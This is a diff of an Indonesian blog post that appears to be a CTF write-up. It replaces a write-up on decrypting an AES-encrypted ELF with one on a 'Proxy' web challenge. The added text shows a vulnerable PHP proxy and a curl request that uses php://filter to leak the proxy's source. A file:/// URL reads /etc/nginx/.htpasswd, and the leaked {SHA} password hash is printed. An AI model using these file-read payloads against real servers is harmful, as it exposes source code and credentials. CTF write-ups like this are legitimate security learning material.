@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 'Writeup FIT FUNFEST 2017 : EncryptedELF'
+title: 'Writeup FIT FUNFEST 2017 : Proxy'
 description: Writeup EncryptedELF FIT FUNFEST CTF
 modified: 'Thu Mar 16 2017 07:00:00 GMT+0700 (WIB)'
 category: Crypto
@@ -17,53 +17,128 @@ private: 'false'
 
 ### Soal
 
-```sh
-$ file myelf
-myelf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
-interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
-BuildID[sha1]=a117956f8826f8ccb19ac6be9d48808c66d1f357, not stripped
-Dapatkan kembali file myelf yang telah dienkripsi menggunakan encrypt.py!
-http://139.59.233.122/soal/crypto/encrypted-elf-revised/encrypt.py
-http://139.59.233.122/soal/crypto/encrypted-elf-revised/encryptedelf
+```
+http://128.199.66.146:12121/proxy/
 ```
 
 ### Solusi
 
-Goals nya Membuat fungsi untuk melakukan dekripsi ELF nya dengan memanfaatkan IV dan
-KEY yang ada di append ke akhir binary dan di XOR dengan magic header ELF
-binary
+Diberikan website seperti layanan proxy kita bisa mengakses website lain melalui
+layanan tersebut kemudian kita memanfaatkan Wrappers yang tidak di blacklist
+untuk membaca file config dan menemukan folder secret yang di authentikasi
+dengan Basic HTTP Authentication kami melakukan decrpyt password .htpasswd
+yang di gunakan algoritma {SHA} kemudian kami mengauthentikasi dan
+mendapatkan flag
 
-Kami membuat script python untuk mengambil IV dan KEY dari bawah file yang
-terencrypt kemudian memisahkan chunks dengan filesize yang ada pada 8 byte
-awal file encryptedelf​ dan kemudian kami melakukan recovery IV dan KEY dengan
-melakukan XOR dengan magic header ELF Binary
+Setelah melakukan analisa kepada layanan yang tersedia yaitu proxy untuk
+membuka website di input field nya ada placeholder http atau https tapi ternyata ada beberapa wrappers yang masih bisa di gunakan karena tidak di disable atau di blacklist. Pertama kita bisa mendapatkan source code layanan proxy dalam base64 dan melakukan decode untuk membaca source code aslinya dengan command
 
-```python
-def decrypt_file(in_filename, out_filename, chunksize=64*1024):
-    filesize = os.path.getsize(in_filename)
-    with open(in_filename, 'rb') as infile:
-        with open(out_filename, 'wb') as outfile:
+`curl http://128.199.66.146:12121/proxy/?url=php://filter/convert.base64-encode/resource=index.php | base64 -d > index.php`
 
-            chunk = infile.read(chunksize)
-            ch = chunk[8:-32]
-            chn = ['\x7f', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00']
-
-            v = chunk[-32:-16:]
-            k = chunk[-16:]
-
-            iv = ''.join(chr(ord(chn[i]) ^ ord(v[i])) for i in range(0, 16))
-
-            print "IV: "+ iv
-            key = ''.join(chr(ord(chn[i]) ^ ord(k[i])) for i in range(0, 16))
-            print "KEY: "+ key
-
-            handler = AES.new(key, AES.MODE_CBC, iv)
-            outfile.write(handler.decrypt(ch))
-            
-decrypt_file('encryptedelf','origelf')
+```php
+<?php
+error_reporting(0);
+if (isset($_GET['url'])) {
+$url = $_GET['url'];
+if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
+die('Not a valid URL');
+}
+$content = file_get_contents($url);
+die($content);
+}
+?>
+<header>
+<title>Proxy</title>
+<link
+href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:300'
+rel='stylesheet' type='text/css'>
+<style type="text/css">
+.form-style-8{
+font-family: 'Open Sans Condensed', arial, sans;
+width: 500px;
+padding: 30px;
+background: #FFFFFF;
+margin: 50px auto;
+box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
+-moz-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
+-webkit-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
+}
+.form-style-8 h2{
+background: #4D4D4D;
+text-transform: uppercase;
+font-family: 'Open Sans Condensed', sans-serif;
+color: #797979;
+font-size: 18px;
+font-weight: 100;
+padding: 20px;
+margin: -30px -30px 30px -30px;}
+.form-style-8 input[type="text"],
+.form-style-8 input[type="date"],
+.form-style-8 input[type="datetime"],
+.form-style-8 input[type="email"],
+.form-style-8 input[type="number"],
+.form-style-8 input[type="search"],
+.form-style-8 input[type="time"],
+.form-style-8 input[type="url"],
+.form-style-8 input[type="password"],
+.form-style-8 textarea,
+.form-style-8 select
+{
+box-sizing: border-box;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+outline: none;
+display: block;
+width: 100%;
+padding: 7px;
+border: none;
+border-bottom: 1px solid #ddd;
+background: transparent;
+margin-bottom: 10px;
+font: 16px Arial, Helvetica, sans-serif;
+height: 45px;
+}
+.form-style-8 textarea{
+resize:none;
+overflow: hidden;
+}
+.form-style-8 input[type="button"],
+.form-style-8 input[type="submit"]{
+-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
+-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
+box-shadow: inset 0px 1px 0px 0px #45D6D6;
+background-color: #2CBBBB;
+border: 1px solid #27A0A0;
+display: inline-block;
+cursor: pointer;
+color: #FFFFFF;
+font-family: 'Open Sans Condensed', sans-serif;font-size: 14px;
+padding: 8px 18px;
+text-decoration: none;
+text-transform: uppercase;
+}
+.form-style-8 input[type="button"]:hover,
+.form-style-8 input[type="submit"]:hover {
+background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
+background-color:#34CACA;
+}
+</style>
+</header>
+<body>
+<div class="form-style-8">
+<h2>PROXY</h2>
+<form>
+<input type="text" name="url" placeholder="http:// or https://" />
+</form>
+</div>
+</body>
 ```
-![encryptedelf-flag.png](/images/encryptedelf-flag.png)
 
-Kemudian di jalankan scriptnya untuk melakukan decrypt.
+Kurang lebih source code tersebut seperti di atas 
 
-**Flag : FIT2017{this_time_is_modern_cipher}**
+`http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/.htpasswd`
+
+isinya seperti ini 
+
+`fit-uksw:{SHA}NABfMvw51MY+i1z+THOgpy9oysc=`
+
